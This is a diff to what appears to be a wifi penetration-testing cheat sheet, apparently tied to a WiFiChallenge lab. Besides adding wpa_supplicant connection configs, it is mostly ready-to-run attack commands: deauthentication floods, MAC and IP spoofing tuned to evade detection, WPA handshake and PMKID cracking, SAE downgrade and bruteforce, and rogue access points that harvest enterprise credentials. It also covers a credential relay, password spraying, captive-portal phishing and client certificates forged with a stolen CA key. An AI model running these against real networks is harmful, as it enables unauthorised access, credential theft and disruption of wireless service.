@@ -47,6 +47,89 @@ iwconfig wlan0mon channel 1
     </Tab>
 </Tabs>
 ### Connect to a wifi network
+#### wpa_supplicant
+<Tabs items={['OPN', 'OWE','WEP','WPA/WPA2 PSK','WPA3-SAE','WPA-WPA2 MGT','MGT with cert']}>
+    <Tab>
+    ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="SSID_NAME"
+        key_mgmt=NONE
+        scan_ssid=1
+    }
+    ```
+    </Tab>
+    <Tab>
+     ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="SSID_NAME"
+        key_mgmt=OWE
+    }
+    ```
+    </Tab>
+    <Tab>
+     ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="SSID_NAME"
+        key_mgmt=NONE
+        wep_key0=PASSWORD
+        wep_tx_keyidx=0
+    }
+    ```
+    </Tab>
+    <Tab>
+     ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="SSID_NAME"
+        psk="PASSWORD"
+    }
+    ```
+    </Tab>
+    <Tab>
+     ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="SSID_NAME"
+        psk="PASSWORD"
+        key_mgmt=SAE
+    }
+    ```
+    </Tab>
+    <Tab>
+     ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="SSID_NAME"
+        key_mgmt=WPA-EAP
+        eap=PEAP
+        anonymous_identity="anonymous"
+        identity="USERNAME"
+        password="PASSWORD"
+        phase2="auth=MSCHAPV2"
+    }
+    ```
+    </Tab>
+    <Tab>
+     ```json copy filename="wpa_supplicant.conf"
+    network={
+        ssid="wifi-global"
+        scan_ssid=1
+        mode=0
+        proto=RSN
+        key_mgmt=WPA-EAP
+        auth_alg=OPEN
+        eap=TLS
+            #anonymous_identity="GLOBAL\anonymous"
+        identity="GLOBAL\GlobalAdmin"
+        ca_cert="./ca.crt"
+        client_cert="./client.crt"
+        private_key="./client.key"
+        private_key_passwd="whatever"
+    }
+    ```
+    </Tab>
+</Tabs>
+```bash copy filename="Terminal"
+wpa_supplicant -i wlan1 -c wpa_supplicant.conf 
+```
+#### nmcli
 ```bash filename="Terminal" copy
 nmcli dev wifi connect SSID_NAME password PASSWORD
 ```
@@ -167,17 +250,7 @@ ip link set wlan2 down
 macchanger -m <CLIENT_MAC> <INTERFACE>
 ip link set wlan2 up
 ```
-Now, Create the `wifi_opn.conf`
-```JSON filename="Terminal" copy
-network={
-    ssid="SSID_NAME"
-    key_mgmt=NONE
-}
-```
-connect to network with **wpa_supplicant**
-```bash filename="Terminal" copy
-sudo wpa_supplicant -i <INTERFACE> -c wifi-opn.conf
-```
+Now, connect with wpa_supplicant
 ##### IP spoofing
 1. Enable ip forwarding
 ```bash copy filename="Terminal"
@@ -191,7 +264,7 @@ ettercap -T -q -i wlan0 -w dump -M ARP /<AUTHORIZED_CLIENT_IP>/ /<GATEWAY_IP>/
 ```bash copy filename="Terminal"
 iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <AUTHORIZED_CLIENT_IP>
 ```
-4. Increate TTL by 1 to avoide detection
+4. Increase TTL by 1 to avoide detection
 ```bash copy filename="Terminal"
 iptables -t mangle -A FORWARD -d <AUTHORIZED_CLIENT_IP> -j TTL --ttl-inc 1
 ```
@@ -253,16 +326,26 @@ Wired Equivilent Privacy. was the first attempt to encrypt the wifi communicatio
     aireplay-ng --arpreplay -b <AP MAC> -h <Fake Client MAC> wlan0mon
     ```
 
-3. **Deauthentication Attacks**
+3. **De Authentication Attacks**
+<Tabs items={['mdk4','aireplay-ng', 'UnicastDeauth']}>
+    <Tab>
+        ```bash copy filename="Terminal"
+        mdk4 wlan0 d -B [BSSID]
+        ```
+    </Tab>
+    <Tab>
+        ```bash copy filename="Terminal"
+            aireplay-ng  -D -0 20 -a <AP MAC> -c <Client MAC> wlan0mon
+        ``` 
+    </Tab>
+    <Tab>
+        ```bash copy filename="Terminal"
+            UnicastDeauth.py -i wlan0 -e $ESSID -b
+        ``` 
+    </Tab>
+    
+</Tabs>
 
-    Force clients to deautnenticate from the AP to force them to authenticate again then capture their IVs during the authentication processes
-    ```bash copy fielname="Terminal"
-    aireplay-ng  -0 1000 -a <AP MAC> -c <Client MAC> wlan0mon
-    ```
-    Can be automated using [UnicastDeauth](https://github.com/mamatb/UnicastDeauth)
-    ```bash copy filename="Terminal"
-    UnicastDeauth.py -i wlan0 -e $ESSID -b
-    ```
 #### Dumping traffic
     ```bash copy fielname="Terminal"
     airodump-ng -c channel_num -bssid BSSID -w output-file wlan0mon
@@ -276,11 +359,7 @@ aircrack-ng capture.cap -b <AP-MAC>
 besside-ng -c 3 -b <AP-MAC> wlan0mon -v
 ````
 ### PSK
-1. Deauthentication attack to force clients to do the handshake again
-```bash copy fielname="Terminal"
-sudo aireplay-ng -0 1000  -a <BSSID> -c <ClientMAC> wlan0mon
-
-```
+1. Deauth attack to force clients to do the handshake again
 2. Capture handshakes
 ```bash copy fielname="Terminal"
 sudo airodump-ng wlan0mon -c <channel> -w ~/wifi/capture
@@ -297,7 +376,7 @@ sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force # Cracking with hash
 #### PMKID vulnerability
 The clientless attack
 ```bash copy fielname="Terminal"
-sudo hcxdumptool -i wlan0mon -w capture.pcapng # capture the PMKID 
+sudo hcxdumptool -i wlan0mon -W capture.pcapng # capture the PMKID 
 aircrack-ng capture.cap # analyze the cap file to check if it has a PMKID or not 
 sudo hcxpcapngtool -o capture.22000 capture.pcapng # convert it to a hashcat format
 sudo hashcat -m 22000 -a 0 capture.22000 /path/to/dictionary.txt # crack
@@ -320,7 +399,7 @@ wpa_passphrase=12345678
 ```copy bash filename="Terminal"
 hostpad hostpad.conf
 ```
-**Automatic hostpad**
+**hostapd**
 ```c showLineNumbers copy fileanme="hostpad.conf"
 interface=$INTERFACE
 driver=nl80211
@@ -334,7 +413,7 @@ wpa_pairwise=TKIP CCMP
 wpa_passphrase=12345678
 ```
 3. <a href="#psk">**Dump and Crack**</a> 
-
+Don't forget to use `airodump-ng` on the bssid of our fake AP
 #### WPS PIN
 ```bash copy fielname="Terminal"
 sudo wash -i wlan0mon 
@@ -403,6 +482,235 @@ This fake Access Point can be configured to be OPN with a Captive portal asking 
 airdecap-ng -e $ESSID -p $PASSWORD ~/wifi/scanc6-01.cap
 ```
 ### Custom Dictionaries
-```c
+
+```bash copy filename="Terminal" 
+mp64 'password?d?d' > variations.txt # maskprocessor from hashcat-utils . customize masks for uppercase (?u), lowercase (?l), digits (?d), and special characters (?s).
+crunch min_length max_length -t password@@@@ > crunch_variations.txt # Customize patterns with @ (letters), % (numbers), ^ (special characters).
+john --wordlist=base_words.txt --rules --stdout > wordlist_variations.txt
 cewl -d 2 -m 5 -w docswords.txt 
 ```
+### SAE 
+(Simultaneous Authentication of Equals) 
+#### WPA2 Downgrade Attack
+1. Make sure that client and AP are not using MFP (Mnanagement Frame Protection). If using it, Deauth attacks won't be possible (**using wifi_db** or **wireshark**)
+2. Perform Deauthentication Attack 
+3. <a href="#noap">**Perform a NoAP Attack**</a> 
+#### Online Bruteforce
+```bash copy filename="Terminal"
+./wacker.py --wordlist $DICCIONARIO --ssid $ESSID --bssid $BSSID --interface $INTERFACE --freq $FRECUENCIA_CANAL
+# U can obtain the frequency from
+## Wikipedia
+sudo iwlist wlan0 frequency | grep 'Channel 12 :'
+```
+<Tabs items={['wacker', 'irgeddon']}>
+    <Tab>
+    ```bash copy filename="Terminal"
+        ./wacker.py --wordlist $DICCIONARIO --ssid $ESSID --bssid $BSSID --interface $INTERFACE --freq 2462
+        # U can obtain the frequency from
+        ## Wikipedia
+        sudo iwlist wlan0 frequency | grep 'Channel 12 :'
+    ``` 
+    </Tab>
+     <Tab>
+     ```
+    # Using its wpa3_online_attack plugin
+    ```
+    </Tab>
+</Tabs>
+#### Evil Twin Attacks
+#### Evil Twin with OPN Attacks
+### MGMT 
+#### Recon
+##### Identity Recon
+- If anonymous identities were not used, we can collect identities (usernames) using
+    ```bash copy filename="Terminal"
+    airodump-ng wlan0mon -c 11 -w /mgmt/ --wps
+    ```
+- Then analyze the output using 
+    -   wiresharek
+        ```bash copy filename="wireshark filter"
+        eap # will show eap identity response messages
+        ```
+    - tshark
+        ```bash copy filename="Terminal"
+        tshark -r /mgmt/scan-01.cap -Y '(eap && wlan.ra == XX:XX:XX:XX:XX:XX) && (eap.identity)' -T fields -e eap.identity
+        ```
+    - wifi_db 
+        ```bash copy filename="Terminal"
+        python3 wifi_db.py -d wifidata.SQLITE /home/user/wifi/ # Generate the sqlitedb from pcap file 
+        sqlitebrowser wifidata.SQLITE # view it 
+        ```
+
+##### Certificate Analysis
+We can extract the server certificate that will be used later for TLS communication from the pcap file using
+- pcapfilter
+    ```bash copy filename="Terminal"
+    pcapFilter.sh -f /mgmtt/scan-02.cap -C
+    ```
+- wireshark 
+    ```bash copy filename="wireshark filter"
+    (wlan.sa == XX:XX:XX:XX:XX:XX) && (tls.handshake.certificate)
+    ```
+- tshark
+    ```bash copy filename="Terminal"
+    tshark -r /home/user/wifi/scan-02.cap -Y "wlan.bssid == XX:XX:XX:XX:XX:XX && ssl.handshake.type == 11" -V
+    ```
+
+##### EAP Authentication Analysis
+Check what EAP authentication protocols are supported by target network
+```bash copy filename="Terminal"
+EAP_buster.sh ssid 'DOMAIN\User' wlan1
+```
+#### Attacks
+##### Rogue AP
+- 2 conditions
+    - client uses username:password for authentication
+    - client doesn't verify the server certificate with an actual CA.
+- Generating a fake certificate
+    ```bash copy filename="Terminal"
+    python3 ./eaphammer --cert-wizard
+    ```
+- Start rogue AP and wait for clients to connect (we can force  with a deauth attack, also note that  most of MGMT APs operate on channel 44)
+    1. If the client usees **MSCHAPv2** 
+        - Start `eaphammer` and collect hashed challenge responses of the clients
+            ```bash copy filename="Terminal"
+            python3 ./eaphammer -i wlan3 --auth wpa-eap --essid $ESSID --creds
+            ```
+        - Crack challenge respnoses
+            ```bash copy filename="Terminal"
+            hashcat -a 0 -m 5500  ~/rockyou.txt --force
+            ```
+    2. If the client uses GTC
+        Same as we did with **MSCHAPv2**. but we can let `eaphammer` to use weakest EAP methods first. if happened. we can obtain clear text credentials without the need for Cracking
+            ```bash copy filename="Terminal"
+            python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate weakest
+            ```
+<Callout type="info" emoji="👻">
+We can also use `airgeddon` or perform the entire attack manually using `hostpad`
+</Callout>
+##### Relay Attack
+1. connect to the real AP. and initiate the challenge handshake processes
+In this, we will use `wpa_sychphant` to redirect all traffic from fake AP to the actual one. with a config file. to make sure that it will connect to the actual AP not our fake one
+    ```json copy filename="wpa_sycophant.config"
+    network={
+    ## ssid is the name of the network you want to rely to. you can relay user credentials to other networks too
+    ssid="$ESSID"
+    ## The SSID you would like to relay and authenticate against. 
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    ## Do not modify
+    identity=""
+    anonymous_identity=""
+    password=""
+    ## This initialises the variables for me.
+    ## -------------
+    eap=PEAP
+    phase1="crypto_binding=0 peaplabel=0"
+    ## if auth failed, use:
+    ## phase1="eapver=1"
+    phase2="auth=MSCHAPV2"
+    ## Dont want to connect back to ourselves,
+    ## so add your rogue BSSID here.
+    bssid_blacklist=$BSSID_AP
+    }
+    ```
+    run it
+    ```bash copy filename="Terminal"
+    wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+    ```
+
+2. Bring up the fake AP
+    ```bash copy filename="Terminal"
+    berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo $ESSID
+    ```
+
+<Callout type="info" emoji="👻">
+If an error occurs when a client connects and the information isn't forwarded to the real AP, you can modify the wpa_sycophant configuration file by replacing `phase1` with the following: `phase1="peapver=1"`, as some APs require version 1.
+</Callout>
+
+##### Bruteforce
+```bash copy filename="Terminal"
+air-hammer.py -i wlan3 -e $ESSID -p $DICCIONARIO -u username.list
+```
+
+<Callout type="error" emoji="👻">
+Authentication servers usually forward the traffic to AD. which may lead to user lockout
+</Callout>
+##### Password Spray
+```bash copy filename="Terminal"
+./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u usernames.list
+```
+##### RogueAP (captive-portal)
+- Create the html captive portal wihtin `./core/wskeyloggerd/templates/user_defined/login/body.html`
+- Start Roguq AP
+    ```bash copy filename="Terminal"
+    sudo killall dnsmasq
+    ./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
+    ```
+<Callout type="info" emoji="👻">
+Rogue AP with a captive portal can be also done also with `airgeddon` or `wifiphisher` which imitates Windows wifi network window
+```bash copy filename="Terminal"
+wifiphisher -aI wlan0 -p wifi_connect --handshake-capture handshake.pcap
+```
+</Callout>
+
+##### Abusing stolen CA
+###### Create AP  
+1. Import the stolen CA key into `eaphammer` 
+    ```bash copy filename="Terminal"
+    python3 ./eaphammer --cert-wizard import --server-cert /path/to/server.crt --ca-cert /path/to/ca.crt --private-key /path/to/server.key --private-key-passwd whatever
+    ```
+
+2. Spawn the fake AP with the stilen CA certificate
+    ```bash copy filename="Terminal
+    python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp 
+    ```
+3. Perform a `deauth` attack against the clients
+###### Create client Cert
+1. Generate client.key
+    ```bash copy filename="Terminal"
+    openssl genrsa -out client.key 2048
+    ```
+2. Prepare config fiels
+    ```json copy filename="client.conf"
+    [ req ]
+    default_bits       = 2048
+    distinguished_name = req_DN
+    string_mask        = nombstr
+    
+    [ req_DN ]
+    countryName                     = "1. Country Name             (2 letter code)"
+    countryName_default             = ES
+    countryName_min                 = 2
+    countryName_max                 = 2
+    stateOrProvinceName             = "2. State or Province Name   (full name)    "
+    stateOrProvinceName_default     = Madrid
+    localityName                    = "3. Locality Name            (eg, city)     "
+    localityName_default            = Madrid
+    0.organizationName              = "4. Organization Name        (eg, company)  "
+    0.organizationName_default      = WiFiChallenge Lab
+    organizationalUnitName          = "5. Organizational Unit Name (eg, section)  "
+    #organizationalUnitName_default  = 
+    commonName                      = "6. Common Name              (eg, CA name)  "
+    commonName_max                  = 64
+    commonName_default              = WiFiChallenge Lab CA
+    emailAddress                    = "7. Email Address            (eg, name@FQDN)"
+    emailAddress_max                = 40
+    emailAddress_default            = client@WiFiChallengeLab.com
+    ```
+    ```json copy filename="client.ext"
+    extensions = x509v3
+    
+    [ x509v3 ]
+    nsCertType = client,email,objsign
+    keyUsage   = digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment
+    ```
+3. Generate CSR 
+    ```bash copy filename="Terminal"
+    openssl req -config client.conf -new -key client.key -out client.csr
+    ```
+4. Sign it with stolen CA
+    ```bash copy filename="Terminal"
+    openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
+    cat client.crt client.key > client.pem.crt
+    ```
